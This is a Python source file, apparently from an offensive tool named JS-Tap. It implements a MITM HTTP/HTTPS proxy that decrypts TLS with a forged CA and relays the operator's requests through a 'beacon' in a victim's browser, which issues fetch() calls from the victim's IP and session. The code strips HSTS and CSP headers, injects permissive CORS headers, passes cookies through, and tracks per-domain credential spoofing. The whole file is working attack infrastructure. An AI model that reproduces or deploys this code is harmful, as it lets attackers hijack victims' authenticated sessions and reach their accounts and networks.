"""
MITM HTTP/HTTPS proxy server for JS-Tap.

Operator points their browser at this proxy. Requests are serialized and sent
over a WebSocket to a bex-beacon, which executes the actual fetch() from the
victim's browser/IP. Responses flow back the same path.

Runs in its own thread, started by the Flask app on demand.
"""
import io
import ssl
import json
import uuid
import socket
import base64
import logging
import tempfile
import threading
import socketserver
from http.server import BaseHTTPRequestHandler

from http import HTTPStatus
from proxy.certs import ensure_ca, generate_domain_cert

logger = logging.getLogger('jsTap')

# ---------------------------------------------------------------------------
# Shared state — written by Flask routes, read by proxy handlers
# ---------------------------------------------------------------------------

# beacon_uuid -> WebSocket send function  (set when beacon connects WS)
_ws_connections = {}
_ws_connections_lock = threading.Lock()
# Lock for serializing WebSocket sends (multiple proxy threads share one WS)
_ws_send_lock = threading.Lock()

# request_id -> threading.Event
_pending_requests = {}
# request_id -> response dict  {status, headers, body_b64}
_pending_responses = {}
_pending_lock = threading.Lock()

# beacon_uuid -> dict of per-domain spoofing config
# { "example.com": True, ... }   True = spoof credentials
_spoof_config = {}
_spoof_lock = threading.Lock()

# Which beacon the proxy is currently routing through (set by /api/proxy/start)
_active_beacon_uuid = None
_proxy_running = False

# CA key/cert (loaded once)
_ca_key = None
_ca_cert = None


def register_ws(beacon_uuid, send_fn):
    """Register a WebSocket send function for a beacon."""
    with _ws_connections_lock:
        _ws_connections[beacon_uuid] = send_fn
    logger.info(f"Proxy: WebSocket registered for beacon {beacon_uuid}")


def unregister_ws(beacon_uuid):
    """Remove a beacon's WebSocket connection."""
    with _ws_connections_lock:
        _ws_connections.pop(beacon_uuid, None)
    logger.info(f"Proxy: WebSocket unregistered for beacon {beacon_uuid}")


def deliver_response(request_id, response_data):
    """Called when a beacon sends back a proxy response over WebSocket."""
    with _pending_lock:
        _pending_responses[request_id] = response_data
        evt = _pending_requests.get(request_id)
    if evt:
        evt.set()


def _send_to_beacon(request_obj, timeout=60):
    """Send a serialized HTTP request to the active beacon and wait for response.
    Returns the response dict or None on timeout."""
    global _active_beacon_uuid

    beacon = _active_beacon_uuid
    if not beacon:
        logger.warning("Proxy: No active beacon configured")
        return None

    with _ws_connections_lock:
        send_fn = _ws_connections.get(beacon)
    if not send_fn:
        logger.warning(f"Proxy: No WebSocket connection for beacon {beacon}")
        return None

    req_id = str(uuid.uuid4())
    request_obj['id'] = req_id

    evt = threading.Event()
    with _pending_lock:
        _pending_requests[req_id] = evt

    try:
        msg = json.dumps(request_obj)
        logger.info(f"Proxy: Sending {request_obj.get('method')} {request_obj.get('url', '')[:80]} to beacon (req_id={req_id})")
        with _ws_send_lock:
            send_fn(msg)
        logger.info(f"Proxy: Message sent, waiting for beacon response (req_id={req_id})")
    except Exception as e:
        logger.error(f"Proxy: Failed to send to beacon: {e}")
        with _pending_lock:
            _pending_requests.pop(req_id, None)
        return None

    evt.wait(timeout=timeout)

    with _pending_lock:
        _pending_requests.pop(req_id, None)
        resp = _pending_responses.pop(req_id, None)

    if not resp:
        logger.warning(f"Proxy: Beacon timed out for request {req_id} ({request_obj.get('method')} {request_obj.get('url', '')[:80]})")

    return resp


# ---------------------------------------------------------------------------
# Raw-socket HTTP reader (used for the inner CONNECT tunnel)
# ---------------------------------------------------------------------------

def _read_chunked_body(rfile):
    """Read a chunked transfer-encoded body and return the reassembled bytes."""
    chunks = []
    while True:
        size_line = rfile.readline(65537)
        if not size_line:
            break
        size_str = size_line.decode('latin-1', errors='replace').strip()
        if not size_str:
            break
        try:
            chunk_size = int(size_str.split(';', 1)[0], 16)
        except ValueError:
            break
        if chunk_size == 0:
            # Read trailing \r\n after the final 0-length chunk
            rfile.readline(65537)
            break
        chunk_data = rfile.read(chunk_size)
        chunks.append(chunk_data)
        # Read the \r\n after the chunk data
        rfile.readline(65537)
    return b''.join(chunks)


def _read_http_request(rfile):
    """Read one HTTP request from a file-like socket stream.
    Returns (method, path, http_version, headers_dict, body_bytes) or None."""
    request_line = rfile.readline(65537)
    if not request_line:
        return None
    request_line = request_line.decode('latin-1', errors='replace').strip()
    if not request_line:
        return None

    parts = request_line.split(' ', 2)
    if len(parts) < 2:
        return None
    method = parts[0]
    path = parts[1]
    http_version = parts[2] if len(parts) > 2 else 'HTTP/1.1'

    headers = {}
    while True:
        line = rfile.readline(65537)
        if not line or line in (b'\r\n', b'\n'):
            break
        line = line.decode('latin-1', errors='replace').strip()
        if ':' in line:
            k, v = line.split(':', 1)
            headers[k.strip()] = v.strip()

    body = b''
    content_length = headers.get('Content-Length') or headers.get('content-length')
    transfer_encoding = headers.get('Transfer-Encoding') or headers.get('transfer-encoding') or ''
    if content_length:
        try:
            body = rfile.read(int(content_length))
        except Exception:
            pass
    elif 'chunked' in transfer_encoding.lower():
        body = _read_chunked_body(rfile)

    return method, path, http_version, headers, body


# Headers that must not be forwarded to the operator's browser through the MITM proxy.
# Alt-Svc:  advertises HTTP/3 (QUIC/UDP) which bypasses the TCP proxy.
# HSTS:     pins certs that won't match our MITM CA.
# CSP:      blocks cross-origin modules/scripts whose context changed through MITM.
# X-Frame-Options:  can block framed content unnecessarily through MITM.
_STRIP_RESPONSE_HEADERS = {
    'alt-svc',
    'strict-transport-security',
    'content-security-policy',
    'content-security-policy-report-only',
    'x-content-security-policy',
    'x-frame-options',
}


def _write_http_response(wfile, status, headers, body, set_cookies=None,
                          request_origin=None):
    """Write an HTTP response to a file-like socket stream.

    request_origin: the Origin header from the request, used to inject
    permissive CORS headers.  The beacon's fetch() runs in an extension
    service-worker whose origin doesn't match the target site, so CORS
    response headers (Access-Control-Allow-Origin, etc.) are often missing
    from the relayed response.  Injecting them here lets the operator's
    browser load cross-origin modules, fonts, and XHR/fetch responses that
    rely on CORS.
    """
    try:
        reason = HTTPStatus(status).phrase
    except ValueError:
        reason = 'Unknown'

    # Always overwrite CORS headers with permissive values.  The beacon's
    # fetch() runs in an extension service-worker whose origin doesn't match
    # the target site, so any CORS headers relayed from the origin server are
    # unreliable / wrong for the operator's browser context.  Strip originals
    # first (they may be under any casing), then inject our own.
    _cors_keys = {
        'access-control-allow-origin', 'access-control-allow-credentials',
        'access-control-allow-methods', 'access-control-allow-headers',
        'access-control-expose-headers', 'access-control-max-age',
    }
    for k in list(headers.keys()):
        if k.lower() in _cors_keys:
            del headers[k]
    headers['Access-Control-Allow-Origin'] = request_origin or '*'
    headers['Access-Control-Allow-Credentials'] = 'true'
    headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, PATCH, OPTIONS'
    headers['Access-Control-Allow-Headers'] = '*'
    headers['Access-Control-Expose-Headers'] = '*'

    status_line = f"HTTP/1.1 {status} {reason}\r\n"
    wfile.write(status_line.encode('latin-1', errors='replace'))
    for k, v in headers.items():
        if k.lower() in _STRIP_RESPONSE_HEADERS:
            continue
        wfile.write(f"{k}: {v}\r\n".encode('latin-1', errors='replace'))
    # Write Set-Cookie headers individually (they must not be joined on a single line)
    if set_cookies:
        for cookie in set_cookies:
            wfile.write(f"Set-Cookie: {cookie}\r\n".encode('latin-1', errors='replace'))
    if 'Content-Length' not in headers and 'content-length' not in headers:
        wfile.write(f"Content-Length: {len(body)}\r\n".encode('latin-1'))
    wfile.write(b"\r\n")
    wfile.write(body)
    wfile.flush()


# ---------------------------------------------------------------------------
# Proxy handler
# ---------------------------------------------------------------------------

class ProxyRequestHandler(socketserver.BaseRequestHandler):
    """Handles one proxy connection from the operator's browser."""

    def handle(self):
        peer = self.client_address
        logger.info(f"Proxy: New connection from {peer[0]}:{peer[1]}")
        try:
            self._handle_connection()
        except (ConnectionResetError, BrokenPipeError) as e:
            logger.info(f"Proxy: Connection closed ({type(e).__name__}) from {peer[0]}:{peer[1]}")
        except ssl.SSLError as e:
            logger.info(f"Proxy: SSL error from {peer[0]}:{peer[1]}: {e}")
        except Exception as e:
            logger.info(f"Proxy: Handler error from {peer[0]}:{peer[1]}: {e}")

    def _handle_connection(self):
        self.request.settimeout(120)
        rfile = self.request.makefile('rb', buffering=0)
        wfile = self.request.makefile('wb')

        try:
            result = _read_http_request(rfile)
            if not result:
                return
            method, target, http_ver, headers, body = result

            if method == 'CONNECT':
                logger.info(f"Proxy: CONNECT {target}")
                self._handle_connect(target, wfile, rfile)
            else:
                self._handle_plain_http(method, target, headers, body, wfile)
        finally:
            try:
                rfile.close()
            except Exception:
                pass
            try:
                wfile.close()
            except Exception:
                pass

    def _handle_plain_http(self, method, url, headers, body, wfile):
        """Forward a plain HTTP request through the beacon."""
        logger.info(f"Proxy: {method} {url}")
        origin = headers.get('Origin', headers.get('origin', ''))

        # Handle CORS preflight locally — no need to round-trip to beacon
        if method == 'OPTIONS':
            _write_http_response(wfile, 204, {}, b'', request_origin=origin)
            return

        resp = _send_to_beacon({
            'method': method,
            'url': url,
            'headers': dict(headers),
            'body': base64.b64encode(body).decode() if body else None,
        })

        if not resp:
            _write_http_response(wfile, 502,
                                 {'Content-Type': 'text/plain'}, b'Proxy: no beacon connected')
            return

        status = resp.get('status', 502)
        resp_headers = resp.get('headers', {})
        body_b64 = resp.get('body', '')
        resp_body = base64.b64decode(body_b64) if body_b64 else b''
        set_cookies = resp.get('setCookies', [])

        _write_http_response(wfile, status, resp_headers, resp_body,
                             set_cookies=set_cookies, request_origin=origin)

    def _handle_connect(self, target, wfile, rfile):
        """MITM a CONNECT tunnel: terminate TLS, read inner HTTP, proxy via beacon."""
        host, _, port = target.partition(':')
        port = int(port) if port else 443

        # Tell the browser the tunnel is established
        wfile.write(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        wfile.flush()

        # Generate a cert for this domain signed by our CA
        cert_pem, key_pem = generate_domain_cert(host, _ca_key, _ca_cert)

        # Write cert+key to temp files for ssl.wrap_socket
        cert_file = tempfile.NamedTemporaryFile(delete=False, suffix='.pem')
        key_file = tempfile.NamedTemporaryFile(delete=False, suffix='.pem')
        try:
            cert_file.write(cert_pem)
            cert_file.close()
            key_file.write(key_pem)
            key_file.close()

            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert_file.name, key_file.name)
            # Force HTTP/1.1 — our parser can't handle HTTP/2 frames
            ctx.set_alpn_protocols(['http/1.1'])

            ssl_sock = ctx.wrap_socket(self.request, server_side=True)
            ssl_sock.settimeout(120)
        except ssl.SSLError as e:
            logger.info(f"Proxy: TLS handshake FAILED for {host}: {e}")
            return
        finally:
            import os as _os
            _os.unlink(cert_file.name)
            _os.unlink(key_file.name)

        logger.info(f"Proxy: TLS handshake OK for {host}")

        # Now read plaintext HTTP requests through the TLS tunnel
        try:
            ssl_rfile = ssl_sock.makefile('rb', buffering=0)
            ssl_wfile = ssl_sock.makefile('wb')

            while True:
                result = _read_http_request(ssl_rfile)
                if not result:
                    break
                method, path, http_ver, headers, body = result

                # Reconstruct the full URL
                url = f"https://{host}{path}"
                logger.info(f"Proxy: {method} {url}")

                origin = headers.get('Origin', headers.get('origin', ''))
                logger.info(f"Proxy: Origin header for {method} {url}: '{origin}'")

                # Handle CORS preflight locally
                if method == 'OPTIONS':
                    _write_http_response(ssl_wfile, 204, {}, b'',
                                         request_origin=origin)
                    conn_hdr = headers.get('Connection', headers.get('connection', ''))
                    if http_ver == 'HTTP/1.0' or conn_hdr.lower() == 'close':
                        break
                    continue

                resp = _send_to_beacon({
                    'method': method,
                    'url': url,
                    'headers': dict(headers),
                    'body': base64.b64encode(body).decode() if body else None,
                })

                if not resp:
                    _write_http_response(ssl_wfile, 502,
                                         {'Content-Type': 'text/plain'},
                                         b'Proxy: beacon did not respond')
                    break

                status = resp.get('status', 502)
                resp_headers = resp.get('headers', {})
                body_b64 = resp.get('body', '')
                resp_body = base64.b64decode(body_b64) if body_b64 else b''
                set_cookies = resp.get('setCookies', [])

                _write_http_response(ssl_wfile, status, resp_headers, resp_body,
                                     set_cookies=set_cookies, request_origin=origin)

                # HTTP/1.0 or Connection: close → done
                conn_hdr = headers.get('Connection', headers.get('connection', ''))
                if http_ver == 'HTTP/1.0' or conn_hdr.lower() == 'close':
                    break

            ssl_rfile.close()
            ssl_wfile.close()
        except (ConnectionResetError, BrokenPipeError, ssl.SSLError, TimeoutError):
            pass
        finally:
            try:
                ssl_sock.close()
            except Exception:
                pass


class ThreadedProxyServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


# ---------------------------------------------------------------------------
# Start / stop
# ---------------------------------------------------------------------------

_server_instance = None
_server_thread = None


def start_proxy(port=8445):
    """Start the MITM proxy server in a background thread."""
    global _server_instance, _server_thread, _proxy_running, _ca_key, _ca_cert

    if _proxy_running:
        logger.info("Proxy: Already running")
        return

    # Ensure CA exists
    _ca_key, _ca_cert = ensure_ca()

    _server_instance = ThreadedProxyServer(('0.0.0.0', port), ProxyRequestHandler)
    _server_thread = threading.Thread(target=_server_instance.serve_forever, daemon=True)
    _server_thread.start()
    _proxy_running = True
    logger.info(f"Proxy: MITM proxy listening on 0.0.0.0:{port}")


def stop_proxy():
    """Shut down the proxy server."""
    global _server_instance, _server_thread, _proxy_running, _active_beacon_uuid

    if _server_instance:
        _server_instance.shutdown()
        _server_instance = None
    _server_thread = None
    _proxy_running = False
    _active_beacon_uuid = None
    logger.info("Proxy: Stopped")


def is_proxy_running():
    return _proxy_running


def get_active_beacon():
    return _active_beacon_uuid


def set_active_beacon(beacon_uuid):
    global _active_beacon_uuid
    _active_beacon_uuid = beacon_uuid


def has_ws_connection(beacon_uuid):
    with _ws_connections_lock:
        return beacon_uuid in _ws_connections


def set_spoof_config(beacon_uuid, domain, enabled):
    with _spoof_lock:
        if beacon_uuid not in _spoof_config:
            _spoof_config[beacon_uuid] = {}
        _spoof_config[beacon_uuid][domain] = enabled


def get_spoof_config(beacon_uuid):
    with _spoof_lock:
        return dict(_spoof_config.get(beacon_uuid, {}))


def get_all_spoof_domains(beacon_uuid):
    """Return the spoof config dict for a beacon."""
    with _spoof_lock:
        return dict(_spoof_config.get(beacon_uuid, {}))
